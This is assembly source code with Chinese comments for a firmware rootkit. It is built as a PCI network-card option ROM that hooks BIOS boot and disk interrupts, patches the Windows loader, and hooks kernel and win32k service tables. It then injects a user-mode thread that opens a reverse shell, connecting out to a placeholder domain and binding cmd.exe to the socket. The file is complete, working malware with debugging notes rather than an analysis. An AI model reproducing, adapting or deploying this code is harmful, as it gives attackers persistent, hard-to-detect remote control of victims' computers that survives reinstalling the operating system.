.586p                                                           ;BIOS中隐藏Telnet后门.
.Model Tiny                                                     ;带详细注释完整源码,代码属性：秘密.不允许公开
;***********************************************************************************************************************************************************************************
ROM_IMAGE_SIZE	   equ 4                                         ;整个模块大小单位KB,固定大小4KB.
CSL_KERNEL_DEST	equ 0FFDF0800h                                ;SharedUserData数据结构线性地址.
CSL_USER_BACKDOOR	equ 07FFE0800h                                ;SharedUserData数据结构线性地址.
;***********************************************************************************************************************************************************************************
RealCode segment use16                           
Code16Start:
;***********************************************************************************************************************************************************************************
      org     00h                                               ;####注意:置代码开始地址以便于确定定置.####,****设置开始偏移:000h****
      dw      0AA55h		                                        ;####注意:ROM头格式标识可以生气独立ROM.####,****标识开始偏移:000h****
      db      ROM_IMAGE_SIZE*2                                  ;####注意:ROM长度(单位:512B,块)最小8块.####,****长度开始偏移:002h****
      jmp     MyROMCodeStart                                    ;####注意:修改ROM模拟跳转指令到这里执行####,****指令开始偏移:003h****
      org     06h                                               ;####注意:编译器根据偏移长度选择JMP命令####,****JMP[rel16]长:003h****
ReturnOldROM:                                                   ;####注意:把数据放在头部以便于确定位置.####,****标识开始偏移:006h****
      db      0e9h,0,0                                          ;####注意:执行完跳转到旧的ROM代码跳转处####,****指令数据偏移:007h****
      db      'CHKSUM=',0                                       ;####注意:填写我们修改后的ROM数据检验和####,****数据偏移地址:010h****	
;***********************************************************************************************************************************************************************************
      org     18h                                               ;编译成支持PCI设备的模块:PCI ROM固定大小4KB,其他参看"PCI 2.2规范"教程
      dd      34001ch,52494350h,813910ech,180000h,200h,2010008h,8000h,506e5024h,201h,6500h,0,20000h,6400h,0,0;硬件realtek PCI8139网卡
;***********************************************************************************************************************************************************************************
MyROMCodeStart:
      pushf
      pushad
      push    es
      push    ds

      sti                                                       ;打开中断,以便接收键盘输入.
      mov     cx,0ffffh                                         ;等待,约为两二秒的按键消息.
      call    WaitPressScrollKey
      .if     !CARRY?                                           ;若按下Scroll Lock键,不运行我们的程序.
;***********************************************************************************************************************************************************************************
              xor     ax,ax
              mov     es,ax
              mov     eax,es:[19h*4]
              mov     es:[84h*4],eax                            ;借用中断向量84H,保存中断向量19H.

              mov     bx,es:[413h]                              ;40:13,BIOS数据区保存常规的内存大小,单位:KBs.
              and     bl,NOT 3                                  ;注意:要求分配的物理内存地址,以页作为基地址 .
              sub     bx,4                                      
              mov     es:[413h],bx                              
              shl     bx,(10-4)                                 ;bx *= 1024 / 16 (KBs->线性地址=KBs*1024,段:除以16)
              mov     es,bx                                     
              xor     di,di                                     ;es:di -> 分配的实模式高端内存前半部分开始处.
              
              push    cs
              pop     ds
              call    GetCurrentAddr                            ;offset Code16End = offset Code32Start
              GetCurrentAddr:
              pop     si                                        ;si->GetCurrentAddr在内存的地址
              mov     dx,si
              
              add     si,Code16End - GetCurrentAddr             ;ds:si->Code16End保护模式代码段内存的地址.
              cld
              mov     cx,((ROM_IMAGE_SIZE / 2) * 1024) / 4      ;拷贝保护模式代码数据到分配内存的前半部分.
              rep     movsd
              
              add     bx,100h                                   
              mov     es,bx                                     
              xor     di,di                                     ;es:0->分配的实模式高端内存后半部分开始处.
              mov     si,dx
              sub     si,GetCurrentAddr - Code16Start           ;ds:si->Code16Start实模式代码的内存的地址.
              mov     cx,((ROM_IMAGE_SIZE / 2) * 1024) / 4      ;拷贝  实模式代码数据到分配内存的后半部分.
              rep     movsd
             
              xor     bx,bx
              mov     ds,bx
              add     dx,NewINT19H - GetCurrentAddr             ;dx->NewINT19H内存的地址
              mov     ds:[19h*4],dx
              mov     ds:[(19h*4) + 2],es                       ;设置成我们的INT19H服务代码
;***********************************************************************************************************************************************************************************
      .endif
      pop     ds
      pop     es
      popad
      popf 
      ;jmp     ReturnOldROM                                     ;跳转到原来的ROM代码的跳转处执行               
      retf
;***********************************************************************************************************************************************************************************      
WaitPressScrollKey:                                             ;函数入口:CX=350约为10ms, 函数延时: 33(us) 
      push    ax
      .repeat
             in      al,60h
             .if     al == 46h                                  ;Scroll Lock键扫描码:46h
                     stc
                     pop    ax
                     ret 
             .endif
             in      al,61h   
             test    al,010h   
             .continue .if  !ZERO?
             .repeat
                     in      al,61h   
                     test    al,10h   
             .until  !ZERO?
             dec    cx
      .until cx == 0
      clc
      pop    ax
      ret
;***********************************************************************************************************************************************************************************
NewINT19H:
      pushf
      ;cli
      push    eax
      push    es
      ;jmp     $                                                ;bochs调试1#.
      xor     ax,ax
      mov     es,ax             
      mov     eax,es:[84h*4]
      mov     es:[19h*4],eax                                    ;恢复中断向量19H值.
      mov     eax,es:[13h*4]
      .if     es:[85h*4] != eax
              mov     es:[85h*4],eax                            ;借用中断向量85H,保存中断向量13H.reserved for BASIC 82h~85h
              mov     word ptr es:[13h*4],NewINT13H             ;设置NewINT13H在内存的地址.
              mov     es:[(13h*4) + 2],cs                       ;设置成我们的INT13H服务代码
      .endif

      pop     es
      pop     eax
      popf                                                      ;恢复现场
      int     84h                                               ;调用旧的中断向量19H.
      iret      
;***********************************************************************************************************************************************************************************
NewINT13H:
      pushf                                                     ;有指令要改变标志寄存器值.
      test    ah, 0bdh                                          ;是不是读数据到内存?ah=02,ah=42h.
      .if     !ZERO?                                            ;ZF=0
              popf
              int    85h                                        ;调用旧的中断向量13H.
              iret
      .endif
      mov     word ptr cs:[INT13LASTFUNCTION],ax
      popf
     
      
      int     85h                                               ;调用旧的中断向量13H.
      .if     CARRY?                                            ;CF=1,读失败退出服务
              iret
      .endif

      pushf
	   ;cli
	   push   es
	   pushad
      ;jmp    $                                                 ;bochs调试2#.可输入指令:u cs:ip + 2.观察INT13LASTFUNCTION的值.
      mov    ax,00h
INT13LASTFUNCTION EQU $-2
	   .if     ah == 42h
	           lodsw
	           lodsw				                                  ;参看"扩展INT13H规范"ds:[si + 2]指传输块数.
	           les    bx,[si]	                                  ;ds:[si + 04h]表示: 传输用的缓冲区内存地址.
      .endif
      .if     al != 00h
              xor     cx,cx              
              mov     cl,al
	           mov     al,8Bh                                    ;设置搜索标志的第一个字节.
	           shl     cx,9	                                     ;(CX * 200h) 搜索搜索计数.
	           mov     di,bx                                     ;8B F0 85 F6 74 21 80 3D:MOV ESI,EAX TEST ESI,ESI JZ $+23h CMP BYTE PTR [ofs32], imm8
              cld                                               ;NTLDR OSLoder模块里的6字节做为标志,进行HOOK.注意:选择HOOK位置很关键!
				  .while   1                                   
                       repne     scasb      
	                    .break    .if  !ZERO?
                       .continue .if  dword ptr es:[di] != 74F685F0h
                       .continue .if  word ptr es:[di+4] != 8021h
                                                                ;(es:di - 1)->我们想被HOOK的指令代码开始处.

                       ;mov     byte ptr es:[di-8],0ebh         ;jmp $指令十六进制值0xebfe,设置在NTLDR暂停.
                       ;mov     byte ptr es:[di-7],0feh              
                       ;设置在NTLDR被HOOK指令处暂停:指令地址[0x31adf1]8:31adf1,注意:INT13H服务中读取NTLDR数据,
                       ;检测HOOK标识代码后,设置HOOK时用的指令及计算指令地址.因为NTLDR数据会被搬移到内存高端处.

                       xor     eax,eax                          
                       mov     ax,cs
                       sub     ax,100h                          ;ax->保护模式代码段
                       mov     bx,ax
                       shl     eax,4                            ;eax->保护模式代码段在内存的物理地址.
                   
                       mov     word ptr es:[di-1],15ffh         ;##FFh/15h:使用CALL NEAR [OFS32]指令进行NTLDR HOOK##
                       mov     es:[di+1],eax                    ;##设置CALL NEAR [OFS32]指令跳转地址,指令占6个字节##
                       ;通过上面获取NTLDR被HOOK处的运行地址:0x31adf1,用bochs调试暂停b 0x31adf1,观察我们的HOOK方式对否?.
                       mov     es,bx
                       or      es:[(KEASSTHOOK_PTE - Code32Start)],eax
                       add     eax,4                            ;eax->NTLDRCallAddr + 4,设置成我们的32位代码开始处执行.
                       mov     dword ptr es:[0],eax             ;es:[0]->保护模式段内变量NTLDRCallAddr所在内存虚拟地址.
                       ;jmp     $                               ;bochs调试3#可用xp es:di - 1观察HOOK情况及r显示寄存器.
             .endw
      .endif   
      popad
      pop     es
      popf
	   iret
;***********************************************************************************************************************************************************************************
Code16End:                                                      ;offset Code32Start = offset Code16End
RealCode ends
;***********************************************************************************************************************************************************************************
ProtectCode segment byte use32                                  ;##########可工作在32位保护模式的代码#########
Code32Start:                                                    ;offset NTLDRCallAddr = offset Code32Start = offset Code16End
      NTLDRCallAddr dd ?                                        

      ;jmp     $                                                ;bochs调试4#,参看在NewINT13H调试为什么没运行到这里?
      pushfd                                                    ;esp = esp + 04h
      pushad                                                    ;esp = esp + 20h
                                                                ;扫描获取模块表基址(_BlLoaderData) 参看"NTLDR分析及源代码".
      mov     edi,[esp + 20h + 04h]                             ;edi->OSLOADER内部.
      and     edi,NOT 000FFFFFh                                 ;转换为镜像基地址 .
      cld
      mov     al,0c7h                                           ;C7h/46h/34h/00h/40h/00h/00h: MOV DWORD PTR [ESI+34h], 4000h
      .while  1
              scasb      
	           .if     ZERO?
                      .break .if  dword ptr [edi] == 40003446h
              .endif
      .endw
      mov     al,0A1H                                           ;A1h/xx/xx/xx/xx: MOV EAX, [xxxxxxxx]
      .while  1
              scasb
              .break  .if     ZERO?
      .endw
      mov     esi,[edi]                                         ;esi->模块链表的开始基地址  .
      mov     esi,[esi]                                         ;esi->模块链表中的第一个节点.
      lodsd
      mov     ebx,[eax+18h]                                     ;EBX = NTOSKRNL.EXE 在内存镜像的基地址.
                                                                ;注意:这里不能直接调用NTOSKRNL导出函数.
      ;jmp     $
;***********************************************************************************************************************************************************************************
	   call    PatchFunction_OverHookFunc                        ;跳转到KeASSTHook后面执行,安装HOOK问题.

KeASSTHook:                                                     ;HOOK KeAddSystemServiceTable   该函数.
                                                                ;lb 0x804c3bc6
	   sub     dword ptr [esp],5			                         ;修正ret指令返回地址为被HOOK函数开始处.
	   pushad                                                    ;保护KeAddSystemServiceTable函数的现场.
	   
	   mov     eax,00000001h                                     ;KEASSTHOOK_PTE:保护模式代码的内存地址.
KEASSTHOOK_PTE EQU $-4                                          
      xor     ecx,ecx
	   mov     ch,((Code32End - Code32Start) + 100h) / 100h      ;注意:代码小于2k,以便放在用户数据空间 .
      mov     edx,0C0000000h				                         ;edx->4MB页目录表中的第一个二级页表项 .
      xor     esi,esi				                               ;esi->我们的代码开始地址,以页为基地址 .
      mov     edi,CSL_KERNEL_DEST			                      ;拷贝代码到SharedUserData数据空间中去 .
	   xchg    [edx],eax                                         ;映射我们代码的物理地址到线性地址00000.
	   wbinvd                                                    
	   rep     movsb                                             ;SharedUserData 空间参看其他相关的教程.
      mov     [edx],eax                                         ;恢复线性地址00000000原来的映射物理页 .
	   wbinvd                                                    ;bochs调试6#:NTOSKRNL.EXE镜像基址 + 64.

                                                                ;保存被HOOK代码数据在堆栈中,后面恢复用.
	   db      6Ah,0						                            ;6Ah/xx: PUSH simm8
KEASSTHOOK_DISPLACED4 EQU $-1
	   pushd   0
KEASSTHOOK_DISPLACED0 EQU $-4
                                                                ;bochs调试8#:lb 0xffdf08a4映射地址之后.
      push    (CSL_KERNEL_DEST + (MyKeAddSystemServiceTable - Code32Start))
      ret							                                  ;跳转到MyKeAddSystemServiceTable函数处.
;***********************************************************************************************************************************************************************************
PatchFunction_OverHookFunc:                                     ;KeAddSystemServiceTable HOOK 问题处理.

	   pop     esi                                               ;esi->KeASSTHook 函数在内存的实际地址 .
	   mov     ecx,PatchFunction_OverHookFunc - KeASSTHook       ;ecx = KeASSTHook 代码的长度,准备移动 .
                                                                ;处理代码中的寻址问题,将KeASSTHook代码.
	   lea     edi,[ebx+40h]                                     ;搬移到NTOSKRNL DOS MZ和PE头之间去执行.
      ;jmp     $                                                ;bochs调试5#,lb edi下一步运行在edi的值.
	   mov     ebp, edi				                               ;ebp用于后面HOOK时计算CALL rel 偏移用 .
	   rep     movsb                                             ;指令:edi->PatchFunction_OverHookFunc .
      
      mov      edx,0A21CD4EEh                                   ;"KeAddSystemServiceTable",0  ->HASH值.
      call     PEApiHashFind                                    ;在NTOSKRNL模块中查找该函数以便HOOK用..
      ;jmp      $                                               ;bochs调试7#可以用到调试HOOK函数lb eax.
      xchg     esi,eax                                          ;指令:esi->KeAddSystemServiceTable函数.

	   sub      edi,PatchFunction_OverHookFunc - KEASSTHOOK_DISPLACED0
	   movsd                                                     ;InLine HOOK方式:保存被HOOK的代码数据 .
	   sub		edi,KEASSTHOOK_DISPLACED0 + 4 - KEASSTHOOK_DISPLACED4
	   movsb

	   mov      byte ptr [esi-5],0e8h			                   ;E8h/xx/xx/xx/xx:CALL rel 相关地址指令.
	   sub      ebp,esi                                          ;调试例如:bochs调试5#edi lb 0x80400040.
	   mov      dword ptr [esi-4],ebp                            ;call KeASSTHook,调试断点bochs调试5#处.

      popad
      popfd
;***********************************************************************************************************************************************************************************
                                                                ;模拟InLineHOOK NTLDR中的指令,并返回去.
      mov      esi,eax
      test     eax,eax
	   jnz      short @F
	   pushfd
	   add      dword ptr [esp+4],21h
	   popfd
@@:
	   ret
;***********************************************************************************************************************************************************************************
MyKeAddSystemServiceTable:                                      ;bochs调试8#:开始是多任务JMP $断点很慢.
                                                                ;首先关闭HOOK NTOSKRNL.EXE!KeAddSystemServiceTable      
      mov     ebp,esp                                           ;bochs调试8#:lb 0xffdf08a4 u /50  查看.
      mov     edi,[ebp+8+20h]			                            ;edi->KeAddSystemServiceTable 函数入口.
                                                                
      mov     ecx,cr0
      mov     edx,ecx
      and     ecx,NOT 00010000h
      mov     cr0,ecx                                           ;CR0.WP关闭页保护功能,以便对当前页修改.

	   pop     eax                                               ;恢复KeAddSystemServiceTable HOOK 数据.
      stosd
      pop     eax
	   stosb

      mov     cr0,edx                                           ;恢复 CR0.WP位到原来的状态            .
;***********************************************************************************************************************************************************************************                                                                
      mov     esi,[ebp+8+28h]                                   ;esi->_W32pServiceTable     服务描述表.
      mov     ecx,[ebp+8+30h]                                   ;ecx:                       服务的数目.
      mov     edi,[ebp+8+34h]                                   ;edi:_W32pArgumentTable     服务参数表.
                                                                ;具体参看"SSDT HOOK教程" ,讲解如何HOOK.
      .while  ecx > 0                                           ;HOOK win32k!NtUserRegisterClassExWOW .
              lodsd
              .if    byte ptr [edi] == 10h                      ;NtUserRegisterHotKey has 4 arguments .
                     mov    edx,20h
                     .while edx > 0
                            .if    byte ptr [eax] == 0f7h       ;F7h/0: TEST mem, imm
                                   mov    ebx,4                 ;search EAX+4..1 for bit mask of prohibited 'fsModifiers' flags
                                   .while ebx > 0
                                          .if    dword ptr [eax + ebx] == 0FFFF7FF0h	
                                                 inc     edi
                                                 .while  1      ;NtUserRegisterClassExWOW will have 6 or 7 arguments  
                                                         sub     esi,4
                                                         dec     edi   
                                                         .if     byte ptr [edi] >= 18h
                                                                 mov     eax,[esi]
                                                                 ;bochs调试9#:JMP $指令断点,在多线程下很慢,尽量采用断点命令.lb 0xffdf08f7
                                                                 mov     edi,(CSL_KERNEL_DEST + (MyNtUserRegisterClassExWOW - Code32Start))
                                                                 mov     [edi + (NTURCEWOW_ORIGINAL - MyNtUserRegisterClassExWOW)],eax
                                                                 mov     [esi],edi
                                                                 jmp     @F
                                                         .endif
                                                 .endw
                                          .endif
                                          dec    ebx
                                   .endw
                            .endif
                            inc    eax
                            dec    edx
                     .endw
             .endif
             inc     edi
             dec     ecx
      .endw
@@:      
;***********************************************************************************************************************************************************************************      
      popad                                                     ;恢复KeAddSystemServiceTable函数的现场.
      ret                                                       ;返回KeAddSystemServiceTable函数去执行.
;***********************************************************************************************************************************************************************************            
MyNtUserRegisterClassExWOW:                                     ;win32k!NtUserRegisterClassExWOW HOOK .

      pushad                                                    ;bochs调试10#:lb 0xffdf091e 调试9#获取.
                                                                ;使用bochs调试命令:x esp     u /50 eip.
      xor     eax,eax                                          
      
      push    (CSL_KERNEL_DEST + (MyNtUserRegisterClassExWOW_SEH - Code32Start))
      push    dword ptr fs:[eax]                                ;在堆栈建立异常结构
      mov     dword ptr fs:[eax],esp                            ;安装我们的异常处理,####调试发现安装的异常处理有时不能工作.####

      ;通过传来的参数检查类名是L"SAS window class" ,替换其'lpfnWndProc'过程,具体参看"win32应用程序窗口消息原理".
      mov     ebp,ds:[7FFE02B4h]                                ;EBP = MmHighestUserAddress These globals are defined in ntos/mm/miglobal.c and set in ntos/mm/mminit.c and ntos/mm/i386/init386.c.
      mov     edx,[esp + 8 + 28h]                               ;edx->窗口类名,格式PUNICODE_STRING.
      .if     edx <= ebp
              .if     word ptr [edx] == 16*2                    ;size of L"SAS window class" 检查字符数对不?
                      mov     esi,[edx + 4]                     
                      .if     esi <= ebp
                              mov     ecx,16                    ; 
                              mov     edx,72ABEC2Dh				 ;72ABEC2Dh <-- HASH("SAS window class")
                              @@:
                                      lodsw
                                      sub     edx,eax
                                      ror     edx,7
                              loop    @B
                              .if     edx == 0                  ;替换窗口过程,前保存旧的过程在PEB中
                                      mov     esi,[esp + 8 +24h];esi->WNDCLASSEXW 类结构.
                                      .if     esi <= ebp
                                              mov     ecx,fs:[edx + 18h]              ;ecx->用户TIB,线程信息块存放线程信息.
                                              mov     ecx,[ecx +30h]                  ;ecx->    PEB,进程环境块存放进程信息.;####注意:是否是获取PEB的方法不通用####
                                              .if     ecx <= ebp                      ;bochs调试11#:lb 0xffdf0971          ;####调试:有时'lpfnWndProc'过程无效####
                                                      mov     eax,(CSL_USER_BACKDOOR + (MySASWndProc - Code32Start))
                                                      xchg    dword ptr [esi + 8],eax ;替换'lpfnWndProc'过程,为我们的过程.
                                                      mov     [ecx + 0eb0h],eax       ;PEB->0EB0h = 旧的'lpfnWndProc' (保存旧的SASWndProc)
                                              .endif
                                      .endif
                              .endif
                      .endif
              .endif
      .endif

;***********************************************************************************************************************************************************************************            
NTURCEWOW_Done:                                                 ;bochs调试11#:lb 0xffdf097f
      xor     eax,eax
      pop     dword ptr fs:[eax]                                ;移除堆栈的异常结构
      pop     ecx                                               ;移除我们的异常处理
      popad
      pushd    0                                                 
NTURCEWOW_ORIGINAL EQU $-4
      ret                                                       ;返回NtUserRegisterClassExWOWHook执行.
;***********************************************************************************************************************************************************************************            
MyNtUserRegisterClassExWOW_SEH:                                 ;注意:安装异常参看"win32应用程序设计".
      xor     eax,eax                                           ;lb 0xffdf098c 调试异常:兼容不很稳定 .

      cdq                                                       ;CDQ常用于除法运算之前调整EDX值.它实际的作用只是把EDX的所有位都设成EAX最高位的值.这里EDX=0.
      mov     dl,0B8h
      add     edx,[esp + 0Ch]				                         ;[esp + c]->Context.传过来的参数.
								                                        ;Context->Eip
      mov     dword ptr [edx],(CSL_KERNEL_DEST + (NTURCEWOW_Done - Code32Start))
	   ret
;***********************************************************************************************************************************************************************************            
MySASWndProc:                                                   ;bochs调试12#: 程序现已运行在应用层下.
                                                                ;lb 0x7ffe099c
	   push    eax                                               ;eax:旧的SASWndProc地址,返回方法:popad ret.
      pushad

      xor     eax,eax
      mov     edx,fs:[eax+30h]                                  ;ptr to PEB
      
      mov     eax,[edx+0EB0h]                                   ;original SASWndProc address
      mov     [esp+20h],eax

      mov     eax,[esp+2Ch]                                     ;get 'uMsg' argument
      .if     eax == 0001h                                      ;WM_CREATE
              mov     eax,[edx+0Ch]                             ;ptr to loader data
              mov     ecx,[eax+1Ch]                             ;ptr to first module in initialization-order list

              .repeat
                      mov     ebx,[ecx+8]                       ;module image base
                      mov     esi,[ecx+20h]                     ;ptr to module file name
                      mov     ecx,[ecx]                         ;ptr to next module
                      lodsb
                      or      al,20h
              .until  al == 'k'                                 ;assume KERNEL32.DLL will be first module starting with 'K'
                                                                ;EBX = KERNEL32 镜像基址 bochs调试13#:lb 0x7ffe09cc
              ;mov     edi,(CSL_USER_BACKDOOR + (PEApiHashFind - Code32Start))
              push    ebx                                       ;ebx:dwThreadID  变量使用堆栈.
              push    esp                                       ;push addr dwThreadID
              push    0
              push    0
              push    (CSL_USER_BACKDOOR + (TelnetShell - Code32Start))
              push    0
              push    0
              mov     edx,3f1764e5h                             ;hash("CreateThread")=3f1764e5h
              call    PEApiHashFind                             ;call     edi 是否需要这样调用?
              call    eax                                       ;invoke CreateThread,NULL,0,offset TelnetShell,NULL,NULL,addr dwThreadID
              pop     ebx                                       ;ebx:dwThreadID 去掉变量使用.
      .endif
      popad
      ret                                                       ;invoke original SASWndProc
;***********************************************************************************************************************************************************************************      
TelnetShell:                                                    ;可用于安装在win2k/xp/2003 反向连接Telnet后门应用程序.
      xor     eax,eax                                           ;bochs调试14#:lb 0x7ffe09f0
      mov     edx,fs:[eax+30h]                                  ;ptr to PEB
      mov     eax,[edx+0Ch]                                     ;ptr to loader data
      mov     ecx,[eax+1Ch]                                     ;ptr to first module in initialization-order list

      .repeat
              mov     ebx,[ecx+8]                               ;module image base
              mov     esi,[ecx+20h]                             ;ptr to module file name
              mov     ecx,[ecx]                                 ;ptr to next module
              lodsb
              or      al,20h
     .until  al == 'k'                                          ;assume KERNEL32.DLL will be first module starting with 'K'
                                                                ;EBX = KERNEL32 image base
      mov     edi,ebx                                           ;edi = kernel32基址 bochs调试15#:lb 0x7ffe0a05
TelnetShell_Strat:
      mov     ebp,esp                                           ;bochs调试15#:lb 0x7ffe0a07

      push    00003233h
      push    5f325357h                                         ;esp->"WS2_32"
      push    esp
      mov     edx,2e864192h                                     ;Hash("LoadLibraryA")=2e864192h
      call    PEApiHashFind
      call    eax                                               ;LoadLibraryA(&WS2_32DLL)返回EAX=装载DLL基址.
      mov     ebx,eax                                           ;ebx=WS2_32基址

      sub     esp,1ech                                          ;WSADATA struct
      push    esp                                               ;esp->WSADATA struct
      push    202h                                              ;VersionRequested 0x202h
      mov     edx,0c05a351eh                                    ;Hash("WSAStartup")=0c05a351eh
      call    PEApiHashFind
      call    eax                                               ;WSAStartup(0x101, &WSADATA)

      push    0
      push    0
      push    0
      push    6                                                 ;IPPROTO_TCP=6 IPPROTO_UDP=17
      push    1                                                 ;SOCK_STREAM=1 SOCK_DGRAM=2
      push    2                                                 ;AF_INET=2
      mov     edx,0ef3c1916h                                    ;Hash("WSASocketA")=0ef3c1916h 
      call    PEApiHashFind
      call    eax                                               ;s=WSASocketA(2,1,6,0,0,0)
      mov     esi,eax                                           ;esi=socket s

      push    000006d6fh
      push    0632e7765h
      push    072636465h
      push    0746f6f72h
      push    02e777777h 

      push    esp                                               ;esp->"www.domain.com"
      mov     edx,07d40befdh                                    ;Hash("gethostbyname")=07d40befdh 
      call    PEApiHashFind
      call    eax                                               ;hptr = gethostbyname("www.yourdomian.com")
      .if     eax == 0
              mov     esp,ebp
              mov     ebx,edi
              jmp     TelnetShell_Strat                         ;for another connection   
      .endif

      mov    eax,[eax+12]
      mov    eax,[eax]
      mov    eax,[eax]

      push    eax      

      push    0feff0002h                                        ;0x02=AF_INET(sin_family);0xfffe=65534(sin_port)

      ;.repeat 
              mov     edx,esp
              push    10h                                       ;sizeof(sockaddr_in)
              push    edx                                       ;esp->sockaddr_in struct
              push    esi                                       ;socket s
              mov     edx,5ddd8b01h                             ;Hash("connect")=5ddd8b01h
              ;mov     ebx,edi                                  ;ebx=kernel32基址
              call    PEApiHashFind
              call    eax                                       ;IPPROTO_TCP c=connect(s, &address, sizeof(address))
      ;.until  eax == 0                                          ;连接成功
      mov     ebx,edi                                           ;ebx=kernel32基址
      .if     eax != 0
              push    60000
              mov     edx,0cb9765ah                             ;Hash("Sleep")=0cb9765ah
              call    PEApiHashFind                             
              call    eax                                       ;invoke Sleep,60000
              mov     esp,ebp
              mov     ebx,edi                                   ;ebx=kernel32基址
              jmp     TelnetShell_Strat                         ;for another connection  
              ;ret
      .endif

      push    646d63h                                           ;winNT(cmd.exe)
      mov     edx,esp                                           ;edx->file name
  
      push    esi                                               ;STARTUPINFOA.hStdError
      push    esi                                               ;STARTUPINFOA.hStdOutput
      push    esi                                               ;STARTUPINFOA.hStdInput 

      push    0                      
      push    0                                                 ;wShowWindow cbReserved2                  
      push    101h                                              ;STARTUPINFO.dwFlags                                      

      mov     ecx,0fh
@@:                              
      push    0                                                 ;STARTUPINFOA.cb ~ STARTUPINFOA.dwFillAttribute
      loop    @B

      lea     ecx,[esp+10h]                                     ;ecx->STARTUPINFOA.cb
      mov     dword ptr [ecx],44h                               ;STARTUPINFOA.CB=44h(len STARTUPINFOA)

      push    esp                                               ;esp->PROCESS_INFORMATION STRUCT(all 0)
      push    ecx                                               ;ecx->STARTUPINFOA STRUCT
      push    0
      push    0
      push    0
      push    1
      push    0
      push    0
      push    edx
      push    0
      mov     edx,4b5d35e6h                                     ;Hash("CreateProcessA")=4b5d35e6h
      call    PEApiHashFind
      call    eax                                               ;CreateProcessA(0, Addr"cmd.exe",0,0,1,0,0,0,si, pi)

      pop     ecx                                               ;PROCESS_INFORMATION.hProcess

      push    -1                                                ;time -1
      push    ecx
      mov     edx,8885abf2h                                     ;Hash("WaitForSingleObject")=8885abf2h 
      call    PEApiHashFind
      call    eax                                               ;WaitForSingleObject(Handle, time) 
      mov     esp,ebp
      mov     ebx,edi                                           ;ebx=kernel32基址
      jmp     TelnetShell_Strat                                 ;for another connection  
      ;ret
;***********************************************************************************************************************************************************************************
PEApiHashFind:                                                  ;入口:EBX=镜像基址 EDX=HASH32值 出口:eax=Api 地址,0表示未找到.
      xor     eax,eax                   
      pushad
      mov     ecx,[ebx+3Ch]                                     ;ecx = RVA of PE header
      mov     ebp,[ebx+ecx+78h]                                 ;ebp = RVA of export directory
      add     ebp,ebx                                           ;ebp -> ptr to export directory
      mov     ecx,[ebp+18h]                                     ;ecx = IMAGE_EXPORT_DIRECTORY::NumberOfNames
      mov     edi,[ebp+20h]                                     ;edi -> IMAGE_EXPORT_DIRECTORY::AddressOfNames
      add     edi,ebx
      .while  ecx > 0
              dec     ecx
              mov     esi,[edi+ecx*4]
              add     esi,ebx                                   ;esi->API字符串在内存物理地址.

              push    edx
              .repeat
                      lodsb
                      sub     edx,eax
                      ror     edx,7
              .until  eax == 0                                  ;字符结束
              .if     edx == 0
        	      pop     edx
                      .break
              .endif
      	      pop     edx
      .endw
      .if     ecx > 0
              mov     edx,[ebp+024h]
              add     edx,ebx                                   ;AddressofOrdinals
              mov     cx,[edx+ecx*2]
              mov     eax,[ebp+01ch]
              add     eax,ebx                                   ;AddressOfFunctions       
              add     ebx,[eax+ecx*4] 
              mov     [esp+1Ch], ebx                            ;overwrite saved EAX with ptr to export
      .endif
      popad
      ret
;***********************************************************************************************************************************************************************************
Code32End:                                                      ;感谢: eEye RootKit RomOS开源项目,国外的技术我们永远学不完.
ProtectCode ends                                                ;注意,开发和测试环境:硬件realtek PCI8139网卡.其他型号没条件测试.都相差不多。自行参考
end   Code16Start
